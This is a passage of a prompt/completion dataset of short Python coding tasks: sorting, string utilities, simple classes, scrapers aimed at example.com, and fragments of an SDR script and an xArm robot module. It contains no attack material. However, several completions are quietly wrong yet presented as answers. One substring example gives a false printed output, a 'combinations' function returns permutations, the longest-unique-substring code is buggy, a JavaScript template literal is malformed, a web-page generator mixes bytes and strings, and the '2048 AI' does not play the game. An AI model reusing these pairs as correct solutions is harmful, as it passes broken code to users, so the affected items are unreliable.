(self.blocks_complex_to_mag_squared_0, 0)) self.connect((self.rtlsdr_source_0, 0), (self.blocks_stream_to_vector_0, 0)) self.connect((self.rtlsdr_source_0, 0), (self.wxgui_fftsink2_0, 0)) def get_threshold(self): return self.threshold def set_threshold(self, threshold): self.threshold = threshold self._threshold_slider.set_value(self.threshold) self._threshold_text_box.set_value(self.threshold) self.blocks_threshold_ff_0.set_hi(self.threshold) def get_samp_rate(self): return self.samp_rate def set_samp_rate(self, samp_rate): self.samp_rate = samp_rate self.rtlsdr_source_0.set_sample_rate(self.samp_rate) self.wxgui_fftsink2_0.set_sample_rate(self.samp_rate) def get_freq(self): return self.freq def set_freq(self, freq): self.freq = freq self._freq_slider.set_value(self.freq) self._freq_text_box.set_value(self.freq) self.rtlsdr_source_0.set_center_freq(self.freq, 0) self.wxgui_fftsink2_0.set_baseband_freq(self.freq) def get_fft_size(self): return self.fft_size def set_fft_size(self, fft_size): self.fft_size = fft_size if __name__ == '__main__': parser = OptionParser(option_class=eng_option, usage=\\"%prog: [options]\\") (options, args) = parser.parse_args() tb = Output_window() tb.Start(True) tb.Wait()"},{"prompt":"Develop a Python 3 script to find all substrings of a given string. String = “codecode”","completion":"def find_substrings(input_string): # Initializing empty list to contain substrings substrings = [] for i in range(len(input_string)+1): for j in range(i+1, len(input_string)+1): # populating the list with substrings substrings.append(input_string[i:j]) return substrings # driver code string = \\"codecode\\" print(find_substrings(string)) # Output: ['c', 'co', 'cod', 'code', 'codec', 'codeco', 'codecod', 'codecode']"},{"prompt":"Generate a function to find the GCD of two numbers in Python.","completion":"def gcd(a,b): if(b==0): return a else: return gcd(b,a%b)"},{"prompt":"Create a Python script which automates the process of making API requests to a given URL. https://example.com","completion":"import requests url = 'https://example.com' # Make get request r = requests.get(url) # Check the response status if r.status_code == 200: print('success') # Make post request r = requests.post(url, data = {'key':'value'}) # Check the response status if r.status_code == 200: print('success')"},{"prompt":"Generate a Python script that takes two arguements, a filename and a number, and prints out all the lines from the filename whose length is less than the number. file_name = 'sample.txt' number = 10","completion":"import sys file_name = sys.argv[1] number = int(sys.argv[2]) with open(file_name, 'r') as f: for line in f: if len(line) < number: print(line, end='')"},{"prompt":"Write a Python code fragment to print all the leap years between two years. start_year = 2010 end_year = 2020","completion":"for year in range(start_year, end_year+1): if year % 4 == 0 and (year % 100 != 0 or year % 400 == 0): print(year)"},{"prompt":"Perform an optimization of a given Python program to reduce its execution time. Sample Program: def find_longest_sequence(arr): current = [] longest = [] i = 0 while i < len(arr): j = i while j < len(arr) and arr[j] > arr[j1]: current.append(arr[j]) j += 1 if len(current) > len(longest): longest = current current = [] i += 1 return longest arr = [3, 10, 2, 1, 20]","completion":"def find_longest_sequence(arr): longest = [] for i in range(len(arr)): current = [] for j in range(i, len(arr)): if arr[j] > arr[j-1]: current.append(arr[j]) if len(current) > len(longest): longest = current current = [] return longest arr = [3, 10, 2, 1, 20]"},{"prompt":"Create a Python program to sort a given list of integers in descending order without using a library/builtin function. ex_list = [5, 2, 8, 9, 4, 1]","completion":"def sort_list(lst): for i in range(len(lst) - 1): for j in range(i+1, len(lst)): if lst[i] < lst[j]: lst[i], lst[j] = lst[j], lst[i] return lst"},{"prompt":"mplement a data structure for a stack in Python.","completion":"class Stack(object): def __init__(self): self.items = [] def is_empty(self): return self.items == [] def push(self, item): self.items.append(item) def pop(self): return self.items.pop() def peek(self): return self.items[len(self.items)-1] def size(self): return len(self.items)"},{"prompt":"Write a Python program that extracts the domain name from a given URL. https://www.google.com","completion":"def get_domain(url): from urllib.parse import urlparse parsed_uri = urlparse(url) domain = '{uri.netloc}'.format(uri=parsed_uri) return domain domain = get_domain(\\"https://www.google.com\\") print(domain)"},{"prompt":"Optimize the following Python program for sorting a given array in ascending order such that it runs in O(n) time complexity. A = [9, 4, 5, 1, 3]","completion":"def sort_array(A): if len(A) <= 1: return A less = [] equal = [] greater = [] pivot = A[0] for num in A: if num < pivot: less.append(num) elif num == pivot: equal.append(num) elif num > pivot: greater.append(num) return sort_array(less) + equal + sort_array(greater)"},{"prompt":"Design a system in Python that takes in two strings as input and finds out if they are anagrams of each other. Two strings: sister and Resist","completion":"def is_anagram(s1, s2): s1 = s1.lower() s2 = s2.lower() if (len(s1) != len(s2)): return False count = {} for i in s1: if i in count: count[i] += 1 else: count[i] = 1 for i in s2: if i in count: count[i] -= 1 else: return False for i in count: if count[i] != 0: return False return True"},{"prompt":"Create a machine learning model in Python that predicts the stock price the next day given past 6 days' prices. Not applicable","completion":"import numpy as np import pandas as pd from sklearn.linear_model import LinearRegression data = pd.read_csv('stock_data.csv') X = data.iloc[:, :-1] y = data.iloc[:, -1] model = LinearRegression() model.fit(X, y) def predict_price(prices): x = np.array(prices).reshape(1, -1) return model.predict(x)[0]"},{"prompt":"Create a Python script to scrape data from a website. The script should take a URL as an argument and return the extracted data as a list of tuples (title, URL) for links on the webpage. Example url: https://en.wikipedia.org/wiki/Web_scraping","completion":"import requests from bs4 import BeautifulSoup def extract_site_information(url): result = requests.get(url) soup = BeautifulSoup(result.text, 'html.parser') data = [] for link in soup.find_all('a'): if link.get('href'): data.append((link.text, link.get('href'))) return data if __name__ == '__main__': url = 'https://en.wikipedia.org/wiki/Web_scraping' print(extract_site_information(url))"},{"prompt":"Program a web crawler in Python to find all URLs on a particular webpage. Page URL: https://www.example.com","completion":"import requests from bs4 import BeautifulSoup def crawl(url): r = requests.get(url) html_doc = r.text soup = BeautifulSoup(html_doc, 'html.parser') # find all links on web page links = soup.find_all('a') # filter the link sending with http for link in links: if 'http' in link.get('href'): print(link.get('href')) # Driver code if __name__ == '__main__': crawl(\\"https://www.example.com\\")"},{"prompt":"Write a Python program for a smart search engine. The program should take a query as input and return the most relevant result. Not applicable","completion":"import json import requests def search_engine(query): # Make a request to the search engine API r = requests.get('http://search-engine.com/api/search', params={'query': query}) # Parse the response response = json.loads(r.text) # Return the most relevant result return response['results'][0] search_engine('python programming')"},{"prompt":"Create a python function to extract the largest DNA sequence from a list of sequences. sequences = [ATGATATCATCGATTGTA, ATGCGATATACGATGAT, ATGGATCGATTATATTA]","completion":"def longest_sequence(sequences): longest_sequence = sequences[0] for sequence in sequences: if len(sequence) > len(longest_sequence): longest_sequence = sequence return longest_sequence print(longest_sequence(sequences)) # ATGATATCATCGATTGTA"},{"prompt":"Write a python program to classify a given list of sentences as positive or negative","completion":"def classify_sentence(sentences): labels = [] for sentence in sentences: # add code to classify the sentence # e.g. using a sentiment classifier labels.append(\\"positive\\" if is_positive(sentence) else \\"negative\\") return labels"},{"prompt":"Construct a Python program to scrape a web page for specific data.","completion":"import requests import bs4 url = \\"YOUR WEBPAGE URL\\" response = requests.get(url) soup = bs4.BeautifulSoup(response.text, 'html.parser') # Retrieve appropriate data from webpage data = soup.find_all('YOUR TAGS') # Code to write the data to a file with open('scraped_data.txt', 'w') as file: for item in data: file.write(str(item))"},{"prompt":"Create a Python program to check if two strings are anagrams. leg, gel","completion":"def is_anagram(s1, s2): # Convert both strings to lower case s1 = s1.lower() s2 = s2.lower() # Sort both strings s1 = sorted(s1) s2 = sorted(s2) if s1 == s2: return True else: return False"},{"prompt":"Generate an AI program in Python that will predict the stock prices for an asset.","completion":"import pandas as pd def predict_stock_prices(data): # Your code here # ... return prediction"},{"prompt":"Generate code in Python to convert an infix expression into a postfix expression.","completion":"# Function to convert Infix expression to Postfix def infixToPostfix(expression): # empty list that will store the postfix expression postfix = [] # dictionary containing the precedence value of operators precedence = {'^':3, '*':3, '/':3, '+':2, '-':2, '(':1} # Stack to store operators stack = [] # Iterate over the expression for conversion for char in expression: # If an operand is encountered, add it to the list postfix if char not in precedence.keys(): postfix.append(char) # If left parenthesis is encountered, push it onto the stack elif char == '(': stack.append(char) # If right parenthesis is encountered, pop from the # stack, till the corresponding left parenthesis is not found # and append all operators to postfix expression elif char == ')': temp = stack.pop() while(temp != '('): postfix.append(temp) temp = stack.pop() # If an operator is encountered, check which operator # has higher precedence, then pop the higher precedence # operator and add it to the postfix expression, then # push the lower precedence operator onto the stack else: while(len(stack) != 0 and precedence[char] <= precedence[stack[-1]]): postfix.append(stack.pop()) stack.append(char) # Pop the remaining operators from the stack and add them while len(stack) != 0: postfix.append(stack.pop()) return \\"\\".join(postfix)"},{"prompt":"mplement the following pseudocode in Python A = [x, y, z] B = [a, b, c] Output: [x, a, y, b, z, c]","completion":"A = [x, y, z] B = [a, b, c] C = [] for x,y in zip(A,B): C.append(x) C.append(y) print(C) #[x, a, y, b, z, c]"},{"prompt":"Design a Python program for Bubble Sort","completion":"def bubble_sort(arr): n = len(arr) for i in range(n): for j in range(0, n-i-1): if arr[j] > arr[j+1]: # swap elements arr[j], arr[j+1] = arr[j+1], arr[j]"},{"prompt":"Write a Python script that takes a list of integers and checks if any two numbers sum up to a given target. [3, 2, 5, 7], target = 9","completion":"def checkSum(arr, target): for i in range(len(arr)): for j in range(i + 1, len(arr)): if arr[i] + arr[j] == target: return True return False nums = [3, 2, 5, 7] target = 9 print(checkSum(nums, target)) # output: True"},{"prompt":"Create a class in Python to store 3D coordinates in Euclidean space.","completion":"class Euclidean3D: def __init__(self, x, y, z): self.x = x self.y = y self.z = z if __name__ == '__main__': point1 = Euclidean3D(1, 2, 3) point2 = Euclidean3D(4, 5, 6)"},{"prompt":"Design an algorithm in Python to convert a binary string into its decimal representation. 1010","completion":"def binaryToDecimals(binary_number): decimal = 0 for i, digit in enumerate(reversed(binary_number)): decimal += int(digit) * (2**i) return decimal print (binaryToDecimals(\\"1010\\")) # Output 10"},{"prompt":"Write a Python program to generate all possible combinations of a set of numbers. nums = [1, 2, 3]","completion":"def combinations(nums): \\"\\"\\" Generate all possible combinations of a given set of numbers Args: nums: a list of integers Returns: A list of list representing the possible combinations \\"\\"\\" # Base case if len(nums) == 0: return [[]] # Recursive step ans = [] for comb in combinations(nums[1:]): for i in range(len(comb)+1): ans.append(comb[:i] + [nums[0]] + comb[i:]) return ans # Call the function with the given input print(combinations(nums))"},{"prompt":"Write a Python program to count the number of even and odd numbers in a given list of integers. [1, 2, 3, 4, 5, 6]","completion":"def count_even_odd(numbers): even_count = 0 odd_count = 0 for num in numbers: if num % 2 == 0: even_count += 1 else: odd_count += 1 return even_count, odd_count"},{"prompt":"Write a function in Python that takes a given string and checks if it is a palindrome or not. racecar","completion":"def isPalindrome(s): left = 0 right = len(s)-1 while(left < right ): if (s[left] != s[right]): return False left += 1 right -= 1 return True print (isPalindrome(\\"racecar\\"))"},{"prompt":"Create a function in Python that takes an input string, counts the occurrence of each word in the string, and returns a dictionary containing the word and its count. Not applicable","completion":"def count_words(string): word_counts = {} words = string.split() for word in words: if word in word_counts: word_counts[word] += 1 else: word_counts[word] = 1 return word_counts string = 'the quick brown fox jumps over the lazy dog' word_counts = count_words(string) print(word_counts) # output: {'the': 2, 'quick': 1, 'brown': 1, 'fox': 1, 'jumps': 1, 'over': 1, 'lazy': 1, 'dog': 1}"},{"prompt":"Create a function in Python to determine whether a given number is an Armstrong number.","completion":"def is_armstrong_number(num): n = len(str(num)) # initialize sum sum = 0 # find the sum of the cube of each digit temp = num while temp > 0: digit = temp % 10 sum += digit ** n temp //= 10 # if num is equal to the sum, # then the number is an Armstrong number if num == sum: return True else: return False"},{"prompt":"Utilizing Python, design a data structure for storing and sorting books according to their ISBN numbers.","completion":"class BookSet: def __init__(self): self.books = [] def add_book(self, book): self.books.append(book) def sort_by_isbn(self): self.books.sort(key=lambda x: x.isbn) class Book: def __init__(self, isbn, title, author): self.isbn = isbn self.title = title self.author = author # Instantiate the BookSet bs = BookSet() # Add books bs.add_book(Book(1234567890, \\"Harry Potter\\", \\"J.K. Rowling\\")) bs.add_book(Book(11223344, \\"Book title\\", \\"Author name\\")) # Sort by ISBN numbers bs.sort_by_isbn()"},{"prompt":"Construct an algorithm in Python to calculate the area of a triangle given its sides. 3 4 5","completion":"def areaTriangle(a, b, c): \\"\\"\\" Calculate the area of a triangle. Parameters: a (float): length of side a b (float): length of side b c (float): length of side c \\"\\"\\" s = (a + b + c) / 2.0 area = (s*(s-a)*(s-b)*(s-c)) ** 0.5 return area a = 3 b = 4 c = 5 area = areaTriangle(a, b, c) print(\\"The area of the triangle is\\", area) # 6.0"},{"prompt":"Create a Python program to provide the sum of all numbers from 0 to N","completion":"def sum_n(n): total = 0 for i in range(n+1): total += i return total"},{"prompt":"Write a script in Python to generate random strings containing uppercase, lowercase, and numeric characters up to a length of 8.","completion":"import random import string def random_string(stringLength=8): letters_and_numbers = string.ascii_uppercase + string.ascii_lowercase + string.digits return ''.join(random.choice(letters_and_numbers) for i in range(stringLength))"},{"prompt":"Create a function in Python that sorts the elements of a given list. [5, 7, 2, 3, 4, 1]","completion":"def sort_list(numbers): numbers.sort() return numbers result = sort_list([5, 7, 2, 3, 4, 1]) print(result)"},{"prompt":"Create a Python script to filter out elements in a list that are divisible by 3. [9, 8, 10, 27, 12, 15]","completion":"numbers = [9, 8, 10, 27, 12, 15] def filter_div_by_3(numbers): return [num for num in numbers if num % 3 != 0] filtered_numbers = filter_div_by_3(numbers) print(filtered_numbers)"},{"prompt":"Write a Python program to classify a dataset with 6 classes. List of sample d","completion":"import pandas as pd # Load the dataset df = pd.read_csv('dataset.csv') # Split the dataset into features and labels X = df.drop('label', axis=1).values y = df['label'].values # Train the model from sklearn.ensemble import RandomForestClassifier model = RandomForestClassifier() model.fit(X, y) # Make predictions on the dataset predictions = model.predict(X)"},{"prompt":"Write a Python program to select a random element from a given list.","completion":"import random def random_element(lst): return random.choice(lst)"},{"prompt":"Write a Python program to filter a list of strings according to a given pattern. Pattern: asterisks Strings: [daisy, sunflower, asterisk, cat, monkey]","completion":"def filter_strings(pattern, strings): filtered_strings = [x for x in strings if pattern in x] return filtered_strings result = filter_strings('asterisks', [\\"daisy\\", \\"sunflower\\", \\"asterisk\\", \\"cat\\", \\"monkey\\"]) print(result)"},{"prompt":"Develop a tool to detect plagiarism in python programs. program1.py def factorial(n): res = 1 for i in range(1, n+1): res = res * i return res program2.py def factorial(n): res = 1 for i in range(1, n+1): res = res * i return re","completion":"\\"\\"\\" Develop a tool to detect plagiarism in python programs \\"\\"\\" import difflib def detect_plagiarism(file1, file2): file1_lines = open(file1).readlines() file2_lines = open(file2).readlines() similarity = difflib.SequenceMatcher(None, file1_lines, file2_lines).ratio() print(\\"Similarity between the two files is : \\" + str(similarity*100) + \\"%\\") if similarity > 0.7: print(\\"Highly Plagiarised code!\\") elif similarity <= 0.7 and similarity > 0.5: print(\\"Moderately Plagiarised Code\\") else: print(\\"Unique code\\") # Driver Code detect_plagiarism(\\"program1.py\\", \\"program2.py\\")"},{"prompt":"Write a Python program to loop through a list and print each element of the list. [1, 2, 3, 4]","completion":"for x in [1, 2, 3, 4]: print(x)"},{"prompt":"Code a function in Python that returns the length of the longest increasing subsequence in a given list of integers. list = [1, 3, 4, 5, 7, 6, 9, 10]","completion":"def longestIncreasingSubsequence(list): n = len(list) maxLength = 0 # Create a list to store the maximum length # of the increasing subsequence ending at 'i' lengthList = [1] * n # Compute optimized values in bottom up manner for i in range(1, n): for j in range(0, i): if (list[i] > list[j] and lengthList[i] < lengthList[j] + 1): lengthList[i] = lengthList[j] + 1 # Pick maximum of all computed values maxLength = max(lengthList) return maxLength"},{"prompt":"Design a Python class to represent a point in a 3D space.","completion":"class Point3D: # constructor to define a point def __init__(self, x, y, z): self.x = x self.y = y self.z = z # method to calculate the distance from origin def distance_from_origin(self): return (self.x**2 + self.y**2 + self.z**2)**(1/2)"},{"prompt":"Edit the following Python function to return a sorted list of the words in the given string. def get_words(text): words = text.split() return word","completion":"def get_words(text): words = text.split() return sorted(words)"},{"prompt":"Design a Python program to calculate simple interest given the principal amount, rate of interest and duration.","completion":"def calculateSimpleInterest(principal, rate, duration): if rate != 0: interest = (principal * rate * duration) / 100 else: interest = 0 return interest"},{"prompt":"Generate a Python code snippet to extract the rate of inflation for a given year from a given JSON. JSON data with rate of inflation for years 20172020","completion":"import json data = '{\\"2017\\":2.2,\\"2018\\":2.4,\\"2019\\":1.7,\\"2020\\":0.1}' inflation_data = json.loads(data) inflation_rate = inflation_data[\\"2020\\"] print(inflation_rate) # Output: 0.1"},{"prompt":"Design and implement a program in Python that converts temperatures from Celsius to Fahrenheit and vice versa.","completion":"def cel_to_fahr(cel): return cel * (9 / 5) + 32 def fahr_to_cel(fahr): return (fahr - 32) * (5 / 9)"},{"prompt":"Design a class in Python to store a student's name, age and subject of interest.","completion":"class Student: def __init__(self, name, age, subject): self.name = name self.age = age self.subject = subject"},{"prompt":"Create a python script to take in a number as input and output its binary equivalent.","completion":"# Input number n = int(input(\\"Enter a number: \\")) # Using format() print(\\"The binary equivalent of {} is:\\".format(n), format(n, 'b'))"},{"prompt":"Create a program in Python to add two numbers using functions. num1 = 5, num2 = 7","completion":"def add(num1, num2): return num1 + num2 result = add(5, 7) print(result)"},{"prompt":"Write a Python function that takes an array of integers and finds the maximum difference between any two elements in the array [2, 3, 10, 6, 4, 8, 1]","completion":"def max_difference(arr): if len(arr) < 2: return 0 curr_max = arr[1]-arr[0] min_elem = min(arr[0], arr[1]) for i in range(2, len(arr)): curr_max = max(curr_max, arr[i] - min_elem) min_elem = min(min_elem, arr[i]) return curr_max print(max_difference([2, 3, 10, 6, 4, 8, 1]))"},{"prompt":"Can you develop a python program that uses a loop to print the numbers 10 to 1 in reverse order?","completion":"for i in range(10, 0, -1): print(i)"},{"prompt":"Create a graphical user interface in Python using Tkinter that allows users to enter name and age information and save the data. Not applicable","completion":"import tkinter # Create main window. main_window = tkinter.Tk() main_window.title(\\"User Data Entry\\") main_window.geometry(\\"200x100\\") # Create entry boxes name_label = tkinter.Label(main_window, text=\\"Name\\") name_label.grid(row=0, column=0, sticky=\\"w\\") name_entry = tkinter.Entry(main_window) name_entry.grid(row=0, column=1, sticky=\\"w\\") age_label = tkinter.Label(main_window, text=\\"Age\\") age_label.grid(row=1, column=0, sticky=\\"w\\") age_entry = tkinter.Entry(main_window) age_entry.grid(row=1, column=1, sticky=\\"w\\") # Create button save_button = tkinter.Button(main_window, text=\\"Save\\") save_button.grid(row=2, column=0, sticky=\\"w\\") main_window.mainloop()"},{"prompt":"Generate a Python script to detect the number of capitalized words in a sentence. sentence = This is a Sample Sentence","completion":"def count_capitals(s): count = 0 arr = s.split(' ') for word in arr: if word[0].isupper(): count += 1 return count"},{"prompt":"Design a program in Python to change the background color of a web page. color = '#FF0000'","completion":"from selenium import webdriver from selenium.webdriver.common.keys import Keys driver = webdriver.Chrome() driver.get(\\"http://example.com\\") html = driver.find_element_by_tag_name('html') html.send_keys(Keys.CONTROL + Keys.SHIFT + Keys.BACKSPACE) driver.execute_script(\\"document.body.style.backgroundColor='\\" + color + \\"'\\")"},{"prompt":"Create a table in Python that stores a list of countries and their population. Not applicable","completion":"import sqlite3 # Establish a connection conn = sqlite3.connect('population.db') cursor = conn.cursor() # Create the table create_query = 'CREATE TABLE population_table (country TEXT, population INT)' cursor.execute(create_query) # Insert data insert_query = 'INSERT INTO population_table VALUES (\\"USA\\", 331000000), (\\"Brazil\\", 212000000), (\\"China\\", 1420000000), (\\"India\\", 1380000000), (\\"Russia\\", 144000000)' cursor.execute(insert_query) # Commit the changes conn.commit() # Close the connection conn.close()"},{"prompt":"Generate a python program to minimize the difference of two given lists list_1 = [3, 2, 4, 1, 6] list_2 = [6, 5, 1, 2]","completion":"def minimize_difference(list_1, list_2): '''This function takes two lists, lists, and minimizes the differences between them.''' min_diff = float('inf') for i in range(len(list_1)): for j in range(len(list_2)): diff = abs(list_1[i] - list_2[j]) if diff < min_diff: min_diff = diff return min_diff"},{"prompt":"Write a Python program to classify the type of an angle based on the measure of the angle. angle = 180","completion":"def classify_angle(angle): if angle == 0: return \\"Zero angle\\" elif angle > 0 and angle < 90: return \\"Acute angle\\" elif angle == 90: return \\"Right angle\\" elif angle > 90 and angle < 180: return \\"Obtuse angle\\" elif angle == 180: return \\"Straight angle\\" result = classify_angle(angle)"},{"prompt":"Write Python script to replace all occurrences of a given letter in a string with another. String: fortnite Letter to replace: t Letter to replace with: l","completion":"\\"\\"\\"Write Python script to replace all occurrences of a given letter in a string with another.\\"\\"\\" # Take a string as an input string = \\"fortnite\\" # Replace the target letter with the replacement letter new_string = string.replace(\\"t\\", \\"l\\") # Print the new string print(new_string)"},{"prompt":"Write a python program to print out the character frequency of a given string. String: hello world!","completion":"string = 'hello world!' freq = {} for i in string: if i in freq: freq[i] += 1 else: freq[i] = 1 print (\\"count of all characters in hello world! is :n \\" + str(freq)) # Output would be count of all characters in hello world! is : {'h': 1, 'e': 1, 'l': 3, 'o': 2, ' ': 1, 'w': 1, 'r': 1, 'd': 1, '!': 1}"},{"prompt":"Write a Python script to sort the following numbers in ascending order [125, 33, 52,45, 24].","completion":"# function to sort the array def sort_nums(arr): # Use Selection Sort Algorithm for i in range(len(arr)): min_index = i for j in range(i+1, len(arr)): if arr[min_index] > arr[j]: min_index = j arr[i], arr[min_index] = arr[min_index], arr[i] return arr # driver code arr = [125, 33, 52, 45, 24] result = sort_nums(arr) print(result)"},{"prompt":"Your client has asked you to convert an existing Java program into a Python program. The Java program takes a list of integers and returns the maximum value. listOfIntegers = [1, 3, 8, 2, 9]","completion":"def get_max_value(listOfIntegers): maxValue = listOfIntegers[0] for num in listOfIntegers: if num > maxValue: maxValue = num return maxValue print(get_max_value(listOfIntegers))"},{"prompt":"Generate a numerical sequence in a given range using Python. start = 3 end = 15","completion":"def generate_sequence(start, end): nums = [] for i in range(start, end+1): nums.append(i) return nums nums = generate_sequence(3, 15) print(nums) // [3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]"},{"prompt":"Code a program in Python to calculate the mean from a dataset [0.07, 0.69, 0.29, 0.17, 0.11, 0.51, 0.5]","completion":"def calculate_mean(numbers): total = 0 for num in numbers: total += num return total / len(numbers) dataset = [0.07, 0.69, 0.29, 0.17, 0.11, 0.51, 0.5] mean = calculate_mean(dataset) print(mean) # Output: 0.3542857142857143"},{"prompt":"Find a bug in the given Python program and fix it. def get_times_table(x): times_table = [] for i in range(10): times_table[i] = x * i return times_table","completion":"def get_times_table(x): times_table = [] for i in range(10): times_table.append(x * i) return times_table"},{"prompt":"Optimize this python code to reduce the number of lines and make it more efficient def calculate_sum(numbers): sum = 0 for n in numbers: sum += n return sum","completion":"def calculate_sum(numbers): return sum(numbers)"},{"prompt":"Convert a set of Python functions to JavaScript. def say_hello(name): return Hello, {}!.format(name) def add_two(num): return num + 2","completion":"function say_hello(name) { return \`Hello, {name}!\`; } function add_two(num) { return num + 2; }"},{"prompt":"Design a function to calculate the volume of a cube in Python.","completion":"def cube_volume(side_length): volume = side_length ** 3 return volume"},{"prompt":"Create a Python script that takes a string and returns an array with the unique characters in the string. string: aeiou","completion":"def unique_chars(s): # Create an empty list unique_list = [] # Intialize index index = 0 # Iterate through the string for i in range(len(s)): # Check if the character is present in # unique_list or not if s[i] not in unique_list: unique_list.append(s[i]) return unique_list # Driver code s = \\"aeiou\\" print(unique_chars(s)) # Output # ['a', 'e', 'i', 'o', 'u']"},{"prompt":"Write a Python program that takes an integer as input and returns a list which contains all the prime numbers up to the given integer. n = 10","completion":"def generate_prime_numbers(n): prime_numbers = [] for num in range(2, n + 1): for i in range(2, num): if (num % i) == 0: break else: prime_numbers.append(num) return prime_numbers if __name__ == \\"__main__\\": n = 10 prime_numbers = generate_prime_numbers(n) print(prime_numbers) # Output: [2, 3, 5, 7]"},{"prompt":"Create a Python function to generate a web page from a given set of HTML and CSS code.","completion":"def generate_web_page(html, css): html = html.encode('utf-8') css = css.encode('utf-8') html = html.replace(\\"<style>\\", f\\"<style>{css}\\") page = f\\"\\"\\"<!DOCTYPE html> <html> <head> <title>Generated web page</title> </head> <body> {html} </body> </html>\\"\\"\\" return page"},{"prompt":"Construct a program, in Python code, to calculate the histogram of the elements in a list. example_list = [1,2,2,2,3,4,5,5,5,5,5]","completion":"def histogram_elements(example_list): histogram = {} for i in example_list: histogram[i] = example_list.count(i) return histogram"},{"prompt":"Write a Python program to find the longest substring in a given string without any repeating characters.","completion":"def find_longest_substring(string): seenChars = set() longestSubstring = '' currentSubstring = '' for char in string: if char not in seenChars: seenChars.add(char) currentSubstring += char if len(currentSubstring) > len(longestSubstring): longestSubstring = currentSubstring else: seenChars.clear() currentSubstring = '' return longestSubstring"},{"prompt":"Create a Python class called Person with attributes name and age.","completion":"class Person: def __init__(self, name, age): self.name = name self.age = age"},{"prompt":"Generate a function in Python that takes a list of values and returns a dictionary with the sums of adjacent values. [1,4,5,6,10]","completion":"def sum_adjacent(my_list): result = {} for i in range(len(my_list)-1): key = (my_list[i],my_list[i+1]) result[key] = my_list[i]+my_list[i+1] return result my_list = [1,4,5,6,10] print(sum_adjacent(my_list)) # Output: {(1, 4): 5, (4, 5): 9, (5, 6): 11, (6, 10): 16}"},{"prompt":"Generate a Python algorithm to generate the following pattern * * * *","completion":"for i in range(4): for j in range(4): print(\\"*\\", end=\\" \\") print()"},{"prompt":"Generate a solution in python that takes a string containing letters and numbers and returns the frequency of each character. helloWorld12345","completion":"def count_frequency(string): counts = {} for char in string: if char in counts: counts[char] += 1 else: counts[char] = 1 return counts"},{"prompt":"Create a Python program to sort a dictionary by value d = {'z': 1, 'b': 2, 'a': 4, 'c': 3}","completion":"def sort_dict_by_value(input_dict): output_list = [] for item in sorted(input_dict.items(), key=lambda x: x[1]): output_list.append(item) return output_list d = {'z': 1, 'b': 2, 'a': 4, 'c': 3} result = sort_dict_by_value(d) print(result)"},{"prompt":"Write a Python AI program to play the 2048 game.","completion":"import pygame # used to display the game board import numpy as np # used to manage board states import time # used for measuring time spent for each move import copy # used to copy game boards # define the game board size BOARD_SIZE = 4 # define useful game constants TILE_2 = 2 TILE_4 = 4 # define useful game variables opening_tile_value = TILE_2 score = 0 # define a game board class class Board: # init game board def __init__(self): self.board = np.zeros((BOARD_SIZE,BOARD_SIZE), dtype=int) self.place_opening_tile() # get available moves def get_available_moves(self): x_direction = [0,1,0,-1] y_direction = [1,0,-1,0] valid_moves = [] # loop through each column/row for i in range(BOARD_SIZE): for j in range(BOARD_SIZE): # loop through each direction for x_dir, y_dir in zip(x_direction, y_direction): x, y = i + x_dir, j + y_dir if 0 <= x < BOARD_SIZE and 0 <= y < BOARD_SIZE and self.board[x][y] == 0: valid_moves.append((i, j, x, y)) return valid_moves # make a move def make_move(self, tile_value, movement): x_from, y_from = movement[0], movement[1] x_to, y_to = movement[2], movement[3] self.board[x_from][y_from] = 0 self.board[x_to][y_to] = tile_value self.place_opening_tile() # place an opening tile def place_opening_tile(self): available_pos = np.where(self.board == 0) if len(available_pos[0]) == 1: x_pos, y_pos = available_pos[0][0], available_pos[1][0] self.board[x_pos][y_pos] = opening_tile_value elif len(available_pos[0]) == 0: # game over pass else: x_pos, y_pos = available_pos[0][np.random.choice(range(len(available_pos[0])))], available_pos[1][np.random.choice(range(len(available_pos[1])))] self.board[x_pos][y_pos] = opening_tile_value"},{"prompt":"The given code contains several Python functions that can be used to check the status of a xArm robot. To use these functions, import them into your Python script and use them as decorators for the functions that you want to check. For example, to check if the robot is connected before running a function, use the \`xarm_is_connected\` decorator. To check if the robot is ready before running a function, use the \`xarm_is_ready\` decorator. To log the API calls made by your script, use the \`api_log\` decorator.","completion":"# !/usr/bin/env python3 # Software License Agreement (BSD License) # # Copyright (c) 2018, UFACTORY, Inc. # All rights reserved. # # Author: Vinman <vinman.wen@ufactory.cc> <vinman.cub@gmail.com> import time import functools from ..core.utils.log import logger from .code import APIState def check_modbus_baud(baud=2000000, _type='set', default=None): def _check_modbus_baud(func): @functools.wraps(func) def decorator(*args, **kwargs): code = args[0].checkset_modbus_baud(baud) if code != 0: logger.error('check modbus baud is failed, code={}'.format(code)) return code if _type == 'set' else (code, default if default != -99 else []) else: return func(*args, **kwargs) return decorator return _check_modbus_baud def xarm_is_connected(_type='set'): def _xarm_is_connected(func): @functools.wraps(func) def decorator(*args, **kwargs): if args[0].connected: return func(*args, **kwargs) else: logger.error('xArm is not connect') return APIState.NOT_CONNECTED if _type == 'set' else (APIState.NOT_CONNECTED, 'xArm is not connect') return decorator return _xarm_is_connected def xarm_is_ready(_type='set'): def _xarm_is_ready(func): @functools.wraps(func) def decorator(*args, **kwargs): if args[0].connected and kwargs.get('auto_enable', False): if not args[0].ready: args[0].motion_enable(enable=True) args[0].set_mode(0) args[0].set_state(0) if args[0].connected: if args[0].state_is_ready: return func(*args, **kwargs) else: logger.error('xArm is not ready') logger.info('Please check the arm for errors. If so, please clear the error first. ' 'Then enable the motor, set the mode and set the state') return APIState.NOT_READY if _type == 'set' else (APIState.NOT_READY, 'xArm is not ready') else: logger.error('xArm is not connect') return APIState.NOT_CONNECTED if _type == 'set' else (APIState.NOT_CONNECTED, 'xArm is not connect') return decorator return _xarm_is_ready def xarm_is_pause(_type='set'): def _xarm_is_pause(func): @functools.wraps(func) def decorator(*args, **kwargs): args[0].check_is_pause() return func(*args, **kwargs) return decorator return _xarm_is_pause def xarm_wait_until_cmdnum_lt_max(only_wait=False): def _xarm_wait_until_cmdnum_lt_max(func): @functools.wraps(func) def decorator(*args, **kwargs): ret = args[0].wait_until_cmdnum_lt_max() if not only_wait and ret is not None: args[0].log_api_info('API -> {} -> code={}'.format(func.__name__, ret), code=ret) return ret return func(*args, **kwargs) return decorator return _xarm_wait_until_cmdnum_lt_max def xarm_is_not_simulation_mode(ret=0): def _xarm_is_not_simulation_mode(func): @functools.wraps(func) def decorator(*args, **kwargs): if not args[0].check_is_simulation_robot(): return func(*args, **kwargs) else: return ret return decorator return _xarm_is_not_simulation_mode def api_log(func): @functools.wraps(func) def decorator(*args, **kwargs): ret = 